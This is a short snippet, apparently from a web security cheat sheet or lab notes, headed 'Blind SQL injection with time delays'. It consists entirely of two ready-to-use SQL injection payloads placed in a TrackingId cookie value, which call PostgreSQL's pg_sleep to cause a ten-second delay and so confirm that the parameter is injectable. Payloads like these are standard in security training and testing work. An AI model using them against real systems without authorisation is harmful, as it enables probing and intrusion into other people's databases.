
### Blind SQL injection with time delays
```
TrackingId=x'+AND+1%3d(SELECT+1+FROM+PG_SLEEP(10))--
TrackingId=x'||pg_sleep(10)--
```
